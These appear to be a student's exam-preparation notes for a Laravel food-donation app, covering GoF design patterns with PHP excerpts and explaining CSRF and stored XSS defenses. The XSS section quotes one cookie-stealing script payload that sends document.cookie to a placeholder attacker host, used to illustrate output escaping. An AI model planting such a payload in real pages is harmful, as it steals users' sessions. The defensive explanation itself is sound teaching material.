🎯 Design Pattern: Observer Pattern (GoF Behavioural)

🗣️ Look Tutor in the Eye & Say (Clear & Direct):
"The Observer Pattern is a design pattern where one main subject automatically notifies multiple listening observers whenever its data or state changes, without needing to know who they are."

Why we use it in Module 1: Publishing surplus food requires multiple side-effects: saving audit logs, sending push emails to registered NGOs, and clearing search caches. If we put all that code inside DonationController@store, the controller becomes bloated and violates the Single Responsibility Principle. With Observer, Laravel listens to the Donation model directly, so notifications work consistently whether food is published from the web UI, imported via Artisan commands, or seeded in tests.

Threat 1: Cross-Site Request Forgery (CSRF — OWASP A05 / CWE-352)

The Attack: A hacker creates an external website with a hidden form pointing to http://127.0.0.1:8000/donations. If a logged-in donor visits that page, their browser automatically sends our session cookie and silently creates spam food listings.
Why validation fails: Form validation only checks if title and quantity are strings or numbers. Since the hacker's hidden form sends valid text, validation passes 100%! Validation cannot verify where the request originated.
NutriShare Defense: Synchronizer Token Pattern (resources/views/donations/create.blade.php Line 15). We put @csrf inside the form. Laravel creates a secret random 256-bit token tied to the user's session. Laravel's VerifyCsrfToken middleware rejects any request without this token with HTTP 419 Page Expired.

Threat 2: Stored Cross-Site Scripting (Stored XSS — OWASP A07 / CWE-79)

The Attack: An attacker types <script>fetch('http://hacker.com?c='+document.cookie)</script> into the food description. When admins or NGOs view the food list, that script executes and steals their cookies.
Why validation fails: We cannot simply reject all < or > characters because legitimate donors write normal text like <Fresh Bread> or Quantity < 50. Validation should not corrupt valid data.
NutriShare Defense: Context-Aware HTML Escaping (resources/views/donations/show.blade.php). We render using Blade's {{ $donation->description }}. Laravel automatically runs htmlspecialchars(..., ENT_QUOTES, 'UTF-8'), turning <script> into safe &lt;script&gt; so the browser prints it as plain text.

public function active(Request $request): JsonResponse {
    try {
        // Validate IFA tracking headers
        $ifa = SecurityHelper::validateIfaRequest($request->all());

        $donations = Donation::with(['donor:id,name,organization_name', 'foodItems'])
            ->active() // Scope: status='available' and not expired
            ->orderBy('created_at', 'desc')
            ->get();

        return response()->json(SecurityHelper::ifaResponse('S', [
            'requestID' => $ifa['requestID'],
            'donations' => $donations,
            'total'     => $donations->count(),
        ]), 200);
    } catch (\Exception $e) {
        return response()->json(
            SecurityHelper::ifaResponse('E', null, 'Failed to fetch active donations.'),
            500
        );
    }
}

❓ Tough Tutor Questions (Easy to Understand Answers):

Q1: Why not just put the email dispatch code inside DonationController@store?
Answer: "If we put it in the controller, it only works when a user clicks the web form. If we import donations from a mobile app API, database seeders, or console commands, the email will never trigger because the controller is bypassed. The Observer hooks into the Eloquent database model lifecycle directly, so notifications work everywhere."
Q2: What happens if the Mail server is offline or lagging when food is published? Does it crash?
Answer: "No! The Observer dispatches SendDonationNotificationJob to Laravel's asynchronous background queue. The database transaction commits immediately, and the donor sees the success page right away without waiting. The background queue worker handles retries independently."
Q3: How does the Observer Pattern differ from the Publish-Subscribe pattern?
Answer: "In classic Observer, the subject knows its observers directly. In Pub-Sub, there is an independent message broker (like Redis or Kafka) in the middle. In Laravel, Eloquent models act as subjects, and Laravel's event dispatcher manages the observer list."

🎯 Design Pattern: Factory Method Pattern (GoF Creational)

🗣️ Look Tutor in the Eye & Say (Clear & Direct):
"The Factory Method Pattern is a creational design pattern that provides an interface or abstract class for creating objects, but lets subclasses decide which concrete class to instantiate."

Why we use it in Module 2: NGOs and Donors have totally different signup rules. NGOs must be set to pending verification and have document upload slots created for their government ROS certificate. Commercial donors are set to approved immediately. If we write a big switch-case statement inside AuthController, it violates the Open/Closed Principle. Using the Factory Method lets us add new roles (like courier drivers) by simply adding a new creator class.

// app/Http/Controllers/Api/UserVerificationApiController.php (Lines 40-85)
public function verifyNgo(Request $request): JsonResponse {
    try {
        $ifa = SecurityHelper::validateIfaRequest($request->all());

        $validated = $request->validate([
            'user_id' => 'required|integer|exists:users,id',
        ]);

        $user = User::find($validated['user_id']);

        if (!$user || $user->role !== 'ngo') {
            return response()->json(SecurityHelper::ifaResponse('F', [
                'requestID'   => $ifa['requestID'],
                'is_verified' => false,
                'reason'      => 'User is not registered as an NGO.',
            ]), 200);
        }

        $isVerified = $user->verification_status === 'approved';
        $hasValidLicense = VerificationDocument::where('user_id', $user->id)
            ->where('status', 'approved')
            ->whereIn('document_type', ['license', 'food_premise_license'])
            ->exists();

        return response()->json(SecurityHelper::ifaResponse('S', [
            'requestID'           => $ifa['requestID'],
            'is_verified'         => $isVerified && $hasValidLicense,
            'verification_status' => $user->verification_status,
            'has_valid_license'   => $hasValidLicense,
            'organization_name'   => $user->organization_name,
            'trust_rating'        => $user->averageRating(),
        ]), 200);
    } catch (\Exception $e) {
        return response()->json(SecurityHelper::ifaResponse('E', null, 'Internal error.'), 500);
    }
}

🎯 Design Pattern: State Pattern (GoF Behavioural)

🗣️ Look Tutor in the Eye & Say (Clear & Direct):
"The State Pattern is a behavioural pattern that allows an object to change its behavior when its internal state changes, appearing as if it changed its class."

Why not just use an Enum? (Tutor Trap): An Enum is only a static string label. But in surplus food logistics, each stage has different rules: in PendingState you can only approve or reject; in ApprovedState you cannot collect food unless a vehicle is assigned. If we used an Enum, we would have messy if-else ladders across controllers, violating the Open/Closed Principle. The State Pattern isolates each state's rules inside its own class.

Context: app/Models/Claim.php Abstract State: app/States/Claim/ClaimState.php Concrete State: PendingState.php Concrete State: ApprovedState.php Concrete State: CollectedState.php 
// 1. Context Model delegates to State: app/Models/Claim.php (Line 93)
namespace App\Models;
use App\States\Claim\{ClaimState, PendingState, ApprovedState, CollectedState};

class Claim extends Model {
    public function getStateObject(): ClaimState {
        return match ($this->status) {
            'approved'  => new ApprovedState($this),
            'collected' => new CollectedState($this),
            default     => new PendingState($this),
        };
    }
}

// 2. PendingState blocks premature collection: app/States/Claim/PendingState.php (Line 21)
namespace App\States\Claim;

class PendingState extends ClaimState {
    public function getStateName(): string { return 'pending'; }

    public function allowedActions(): array {
        return ['approve', 'reject', 'cancel']; // 'collect' is blocked here!
    }

    public function canPerform(string $action): bool {
        return in_array(strtolower($action), $this->allowedActions());
    }
}

// 3. ApprovedState enforces vehicle rule: app/States/Claim/ApprovedState.php (Line 25)
class ApprovedState extends ClaimState {
    public function canPerform(string $action): bool {
        if ($action === 'collect') {
            return $this->claim->vehicle !== null; // Invariant: Must assign vehicle!
        }
        return in_array(strtolower($action), ['collect', 'cancel']);
    }
}

🎯 Design Pattern: Strategy Pattern (GoF Behavioural)

🗣️ Look Tutor in the Eye & Say (Clear & Direct):
"The Strategy Pattern is a design pattern that defines a family of algorithms, encapsulates each one into a separate class, and makes them swappable at runtime."

Why we use it in Module 4: Warehouse facility management requires different notification channels. Low-priority updates use cheap SMTP Email. But critical cold-chain failures (e.g. freezer temperature rising above 4°C) require urgent SMS dispatch. Hardcoding communication APIs directly inside InventoryController violates the Open/Closed Principle. The Strategy Pattern decouples the controller from specific communication gateways.

// 2. Concrete Strategy: app/Strategies/Notification/EmailStrategy.php (Lines 14-30)
namespace App\Strategies\Notification;
use App\Models\User;
use Illuminate\Support\Facades\Mail;

class EmailStrategy implements NotificationStrategyInterface {
    public function send(User $recipient, string $subject, string $message): bool {
        Mail::raw($message, function ($mail) use ($recipient, $subject) {
            $mail->to($recipient->email)->subject("[NutriShare] {$subject}");
        });
        return true;
    }
    public function getChannelName(): string { return 'email'; }
}

// 3. Context Dispatcher: app/Strategies/Notification/NotificationDispatcher.php (Lines 45-65)
namespace App\Strategies\Notification;
use App\Models\User;

class NotificationDispatcher {
    public function resolveStrategy(string $channel): NotificationStrategyInterface {
        return match (strtolower($channel)) {
            'sms'   => new SmsStrategy(),
            'email' => new EmailStrategy(),
            default => new EmailStrategy(),
        };
    }

    public function dispatch(User $recipient, string $subject, string $message, ?string $channel = null): bool {
        $selectedChannel = $channel ?? $recipient->notification_preference ?? 'email';
        $strategy = $this->resolveStrategy($selectedChannel);
        return $strategy->send($recipient, $subject, $message);
    }
}

// app/Http/Controllers/Api/InventoryApiController.php (Lines 80-115)
public function checkSafety(Request $request): JsonResponse {
    try {
        $ifa = SecurityHelper::validateIfaRequest($request->all());

        $validated = $request->validate([
            'food_item_id' => 'required|integer|exists:food_items,id',
        ]);

        $item = FoodItem::with(['category', 'allergenTags'])->find($validated['food_item_id']);
        $isExpired = $item->expiry_date ? $item->expiry_date->isPast() : false;
        $daysToExpiry = $item->expiry_date ? now()->diffInDays($item->expiry_date, false) : null;
        $isSafe = !$isExpired && ($daysToExpiry === null || $daysToExpiry >= 0);

        return response()->json(SecurityHelper::ifaResponse('S', [
            'requestID' => $ifa['requestID'],
            'food_item' => [
                'id'             => $item->id,
                'name'           => $item->name,
                'safety_status'  => $isSafe ? 'SAFE' : 'EXPIRED / AT RISK',
                'days_remaining' => $daysToExpiry,
                'is_expired'     => $isExpired,
            ],
        ]), 200);
    } catch (\Exception $e) {
        return response()->json(SecurityHelper::ifaResponse('E', null, 'Internal error.'), 500);
    }
}

❓ Tough Tutor Questions (Easy to Understand Answers):

Q1: What is the difference between Strategy Pattern and Observer Pattern?
Answer: "Observer is one-to-many: one event happens and notifies multiple listeners. Strategy is one-to-one: the context chooses and executes exactly one swappable algorithm at a time (Email vs SMS)."
Q2: What stops an attacker from saving an HMAC signed URL and using it next week?
Answer: "The signed URL includes an expires timestamp inside the cryptographic signature. When clicked, Laravel verifies that now()->timestamp <= expires. If expired, access is blocked immediately."
Q3: Why sanitize CRLF in the model mutator instead of doing it in the blade view?
Answer: "Sanitizing in the view only protects the web browser. System logs are read in terminal consoles, external SIEM monitors, and database viewers. Sanitizing in the model mutator protects all log consumers at the source."
